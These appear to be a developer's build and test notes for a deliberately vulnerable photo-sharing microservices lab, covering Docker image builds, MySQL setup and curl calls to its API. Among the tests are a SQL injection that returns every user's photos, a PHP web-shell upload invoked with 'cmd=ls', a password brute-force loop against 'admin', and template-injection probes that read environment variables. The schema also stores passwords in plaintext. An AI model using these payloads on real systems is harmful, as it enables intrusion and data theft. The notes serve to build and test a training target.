```
docker build -t usatpath01/vulnerable-photo-app-frontend:latest ./frontend
docker build -t usatpath01/vulnerable-photo-app-api-gateway:latest ./api_gateway
docker build -t usatpath01/vulnerable-photo-app-user-service:latest ./user_service
docker build -t usatpath01/vulnerable-photo-app-photo-service:latest ./photo_service
docker build -t usatpath01/vulnerable-photo-app-notification-service:latest ./notification_service
docker build -t usatpath01/vulnerable-photo-app-recommendation-service:latest ./recommendation_service
docker build -t usatpath01/vulnerable-photo-app-analytics-service:latest ./analytics_service
docker build -t usatpath01/vulnerable-photo-app-profile-service:latest ./profile_service
```
```
docker push usatpath01/vulnerable-photo-app-frontend:latest
docker push usatpath01/vulnerable-photo-app-api-gateway:latest
docker push usatpath01/vulnerable-photo-app-user-service:latest
docker push usatpath01/vulnerable-photo-app-photo-service:latest
docker push usatpath01/vulnerable-photo-app-notification-service:latest
docker push usatpath01/vulnerable-photo-app-recommendation-service:latest
docker push usatpath01/vulnerable-photo-app-analytics-service:latest
docker push usatpath01/vulnerable-photo-app-profile-service:latest
```

```
from api container
apk add curl
curl http://user_service:5000/api/v1/users/test-db-connection
```

```
docker exec -it e38172ae10a5 mysql -uroot -pinsecure_password
USE users;
CREATE TABLE users (
    id INT AUTO_INCREMENT PRIMARY KEY,
    username VARCHAR(255) NOT NULL UNIQUE,
    password VARCHAR(255) NOT NULL,
    email VARCHAR(255) NOT NULL UNIQUE,
    is_admin BOOLEAN DEFAULT FALSE
);
INSERT INTO users (username, password, email) VALUES ('user1', 'user1_1234', 'user1@gmail.com');
```

```
docker exec -it e38172ae10a5 mysql -uroot -pinsecure_password
USE photos;
CREATE TABLE IF NOT EXISTS photos (
    id INT AUTO_INCREMENT PRIMARY KEY,
    filename VARCHAR(255) NOT NULL,
    user_id INT NOT NULL,
    upload_date TIMESTAMP DEFAULT CURRENT_TIMESTAMP);

INSERT INTO photos (filename, user_id, upload_date) VALUES ('docker.png', 1, '2001-09-10');

```



# Endpoint
```
curl -X POST "http://10.5.20.45:8000/api/users/login"      -H "Content-Type: application/json"      -d '{"username":"testuser","password":"testpassword"}'
{
  "message": "Login successful", 
  "status": "success", 
  "user": {
    "email": "testuser@example.com", 
    "id": 1, 
    "username": "testuser"
  }
}

curl -X POST "http://10.5.20.45:8000/api/users/login"      -H "Content-Type: application/json"      -d '{"username":"testuser","password":"testpasswossrd"}'
{
  "message": "Invalid credentials", 
  "status": "error"
}

curl -X POST "http://10.5.20.45:8000/api/users/register"      -H "Content-Type: application/json"      -d '{"username":"newuser", "password":"newpassword", "email":"newuser@example.com"}'
{
  "message": "User registered successfully", 
  "status": "success", 
  "user": {
    "email": "newuser@example.com", 
    "id": 1, 
    "username": "newuser"
  }
}

curl -X POST "http://10.5.20.45:8000/api/users/register"      -H "Content-Type: application/json"      -d '{"username":"user99", "password":"user99_1234", "email":"user99@gmail.com"}'

curl -X POST "http://10.5.20.45:8000/api/users/login"      -H "Content-Type: application/json"      -d '{"username":"user99","password":"user99_1234"}'

curl -X POST "http://10.5.20.45:8000/api/photos/upload" \
     -H "Content-Type: multipart/form-data" \
     -F "file=@Docker.png" \
     -F "user_id=1"

{
  "filename": "9e210176-6c49-42c4-8e44-136642a0b275.png", 
  "message": "File uploaded successfully", 
  "status": "success"
}

curl -X POST "http://10.5.20.45:8000/api/photos/upload" \
     -H "Content-Type: multipart/form-data" \
     -F "file=@test.png" \
     -F "user_id=3"

curl -X GET "http://10.5.20.45:8000/photos?user_id=1"
```
curl -X POST "http://10.5.20.45:8000/api/photos/upload" \
     -H "Content-Type: multipart/form-data" \
     -F "file=@Docker.png" \
     -F "user_id=3"
{"filename":"e1d70097-dc14-4ddf-948b-efc113304eac.png","message":"File uploaded successfully","status":"success"}

mysql> select * from photos;
+----+------------------------------------------+---------+---------------------+
| id | filename                                 | user_id | upload_date         |
+----+------------------------------------------+---------+---------------------+
|  1 | docker.png                               |       1 | 2001-09-10 00:00:00 |
|  2 | e1d70097-dc14-4ddf-948b-efc113304eac.png |       2 | 2024-09-20 15:37:39 |
|  3 | b40051e6-de40-42fb-aee5-82646e39f2a8.png |       3 | 2024-09-20 15:39:00 |
+----+------------------------------------------+---------+---------------------+
3 rows in set (0.00 sec)

 curl -X GET "http://10.5.20.45:8000/api/photos?user_id=1"
{
  "photos": [
    [
      1, 
      "docker.png", 
      1, 
      "Mon, 10 Sep 2001 00:00:00 GMT"
    ]
  ], 
  "status": "success"
}


curl -X GET "http://10.5.20.45:8000/api/photos?user_id=1%20OR%201%3D1"
{
  "photos": [
    [
      1, 
      "docker.png", 
      1, 
      "Mon, 10 Sep 2001 00:00:00 GMT"
    ], 
    [
      2, 
      "e1d70097-dc14-4ddf-948b-efc113304eac.png", 
      2, 
      "Fri, 20 Sep 2024 15:37:39 GMT"
    ], 
    [
      3, 
      "b40051e6-de40-42fb-aee5-82646e39f2a8.png", 
      3, 
      "Fri, 20 Sep 2024 15:39:00 GMT"
    ]
  ], 
  "status": "success"
}

curl "http://10.5.20.45:8000/api/photos/ffb2d665-3916-47a9-99fd-3c170462a0aa.php?user_id=1&cmd=ls"

curl -X GET "http://10.5.20.45:8000/api/photos/1762071b-9466-48ef-87ae-cd956b34c4fb.png" --output downloaded_image.png

curl -X POST "http://10.5.20.45:8000/api/photos/upload" \
     -H "Content-Type: multipart/form-data" \
     -F "file=@malicious.php" \
     -F "user_id=123"
{"filename":"b124236a-f516-4c1f-a022-408f32e071dc.php","message":"File uploaded successfully","status":"success"}

curl -X POST "http://10.5.20.45:8000/api/recommendations/populate_books"
{
  "message": "Added 10 books to the database", 
  "status": "success"
}

url -X GET "http://10.5.20.45:8000/api/recommendations/debug/books"
{
  "books": [
    {
      "author": "Frank Herbert", 
      "category": "books", 
      "genre": "sci-fi", 
      "title": "Dune"
    }, 
    {
      "author": "William Gibson", 
      "category": "books", 
      "genre": "sci-fi", 
      "title": "Neuromancer"
    }, 
    {
      "author": "George Orwell", 
      "category": "books", 
      "genre": "dystopian", 
      "title": "1984"
    }, 
    {
      "author": "Harper Lee", 
      "category": "books", 
      "genre": "fiction", 
      "title": "To Kill a Mockingbird"
    }, 
    {
      "author": "J.R.R. Tolkien", 
      "category": "books", 
      "genre": "fantasy", 
      "title": "The Hobbit"
    }, 
    {
      "author": "Jane Austen", 
      "category": "books", 
      "genre": "romance", 
      "title": "Pride and Prejudice"
    }, 
    {
      "author": "J.D. Salinger", 
      "category": "books", 
      "genre": "fiction", 
      "title": "The Catcher in the Rye"
    }, 
    {
      "author": "Aldous Huxley", 
      "category": "books", 
      "genre": "dystopian", 
      "title": "Brave New World"
    }, 
    {
      "author": "Isaac Asimov", 
      "category": "books", 
      "genre": "sci-fi", 
      "title": "The Foundation Trilogy"
    }, 
    {
      "author": "J.R.R. Tolkien", 
      "category": "books", 
      "genre": "fantasy", 
      "title": "The Lord of the Rings"
    }
  ], 
  "status": "success"
}


curl -X GET "http://10.5.20.45:8000/api/recommendations/recommend?user_id=14"
{
  "message": "New user, no preferences set", 
  "recommendations": [], 
  "status": "success"
}

curl -X POST "http://10.5.20.45:8000/api/recommendations/update_preferences" -H "Content-Type: application/json" -d '{"user_id": "14", "preferences": {"category": "books", "genre": "sci-fi"}}'
{
  "message": "Preferences updated", 
  "status": "success"
}

curl -X GET "http://10.5.20.45:8000/api/recommendations/recommend?user_id=14"
{
  "recommendations": [
    {
      "_id": "66f44ed086117430e217f72a", 
      "author": "Frank Herbert", 
      "category": "books", 
      "genre": "sci-fi", 
      "title": "Dune"
    }, 
    {
      "_id": "66f44ed086117430e217f72b", 
      "author": "William Gibson", 
      "category": "books", 
      "genre": "sci-fi", 
      "title": "Neuromancer"
    }, 
    {
      "_id": "66f44ed086117430e217f732", 
      "author": "Isaac Asimov", 
      "category": "books", 
      "genre": "sci-fi", 
      "title": "The Foundation Trilogy"
    }
  ], 
  "status": "success"
}


# Users SQL injection
curl -v "http://10.5.20.45:8000/api/users?username=newuser1"


for i in {1..100}; do 
  curl -X POST "http://10.5.20.45:8000/api/users/login" \
       -H "Content-Type: application/json" \
       -d '{"username": "admin", "password": "password'$i'"}'; 
done


# Test with a normal username
curl -v "http://10.5.20.45:3000/profile?username=test"

# Test with an EJS arithmetic operation
curl -v "http://10.5.20.45:3000/profile?username=%3C%25%3D%207%20*%207%20%25%3E"

# Test with a JavaScript arithmetic operation
curl -v "http://10.5.20.45:3000/profile?username=7%20*%207"

# Test with an attempt to access process.env
curl -v "http://10.5.20.45:3000/profile?username=%3C%25%3D%20process.env.NODE_ENV%20%25%3E"

# Test with an attempt to execute a function
curl -v "http://10.5.20.45:3000/profile?username=(()%20%3D%3E%20'Hello')()"


```
docker tag usatpath01/vulnerable-photo-app-analytics-service:v1 usatpath01/vulnerable-photo-app-analytics-service:v1
docker tag usatpath01/vulnerable-photo-app-notification-service:v1 usatpath01/vulnerable-photo-app-notification-service:v1
docker tag usatpath01/vulnerable-photo-app-api_gateway:v1 usatpath01/vulnerable-photo-app-api_gateway:v1
docker tag usatpath01/vulnerable-photo-app-frontend-service:v1 usatpath01/vulnerable-photo-app-frontend-service:v1
docker tag usatpath01/vulnerable-photo-app-photo-service:v1 usatpath01/vulnerable-photo-app-photo-service:v1
docker tag usatpath01/vulnerable-photo-app-recommedation-service:v1 usatpath01/vulnerable-photo-app-recommedation-service:v1
docker tag usatpath01/vulnerable-photo-app-user-service:v1 usatpath01/vulnerable-photo-app-user-service:v1
```
```
git push -u origin main
```


split -l 360 --additional-suffix=.log getprofile_new-WK5-SMRL.txt getprofile_new-WK5-SMRL